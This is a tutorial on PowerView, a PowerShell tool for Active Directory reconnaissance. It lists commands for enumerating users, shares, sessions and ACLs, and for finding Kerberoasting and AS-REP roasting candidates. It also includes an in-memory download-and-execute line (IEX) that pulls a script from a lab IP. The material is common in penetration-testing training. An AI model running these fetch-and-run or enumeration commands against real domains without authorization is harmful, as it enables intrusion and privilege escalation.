**PowerView** is a tool (a PowerShell module) for **Active Directory enumeration and reconnaissance**. It is not an exploit: it’s used to map the domain, find users, computers, shares, GPOs, delegations and possible attack vectors before attempting access or privilege escalation.


---

# What it’s used for (main capabilities)

- Enumerating domain users, groups and computers.
- Finding policies (password/lockout/Kerberos), OUs and GPOs.
- Locating interesting shares, machines with RDP/WinRM, privileged accounts or delegation settings.    
- Discovering relationships between accounts and services (for example, accounts used by services).
- Automating the search for vectors: accounts without preauth, accounts with SPNs (Kerberoasting), unpatched machines, etc.


---

## How to load and run it 

You can execute PowerView in memory (it won’t leave a file on disk if you load it with `IEX`), for example:

```powershell
# Download and execute in memory (lab)
IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5:8000/PowerView.ps1')

# Or, if you already have the file locally
. .\PowerView.ps1    # dot-source to import functions into the session
```

> Note: many defenses detect `IEX` + download + script execution, so this is noisy in production environments.

---

## Useful commands & examples 

Basic domain enumeration:

```powershell
Get-NetDomain               # general domain info
Get-DomainPolicy            # domain policies (password/lockout)
Get-NetForest               # forest info
```

List users and properties:

```powershell
Get-NetUser                 # list users (sAMAccountName, etc.)
Get-DomainUser -Properties userAccountControl |
  Select-Object sAMAccountName,userAccountControl
```

Find “Do not require preauthentication” accounts (AS-REP roast candidates):

```powershell
Get-DomainUser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }
```

Enumerate computers and services:

```powershell
Get-NetComputer            # list computers
Invoke-ShareFinder         # search for interesting shares on domain machines
Find-InterestingDomainShare  # find shares that might contain creds/flags
```

Find SPNs for Kerberoasting:

```powershell
Get-DomainUser -SPN        # list accounts with SPNs
Get-DomainSID             # get domain SID
```

Search for delegation / privileged accounts:

```powershell
Get-ObjectAcl -SamAccountName 'Domain Users' -ResolveGUIDs  # advanced example
Get-NetGroupMember -Identity 'Domain Admins'
```

Enumerate ACLs and objects where a user can write:

```powershell
Get-ObjectAcl -DistinguishedName "CN=SomeObject,..." -ResolveGUIDs
# or find computers where a user is allowed to create services
Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo  # example using AD cmdlets
```

Find active sessions / machines with RDP/WinRM:

```powershell
Get-NetSession               # SMB sessions
Get-NetLoggedon -Remote      # logged-on sessions on remote hosts
```
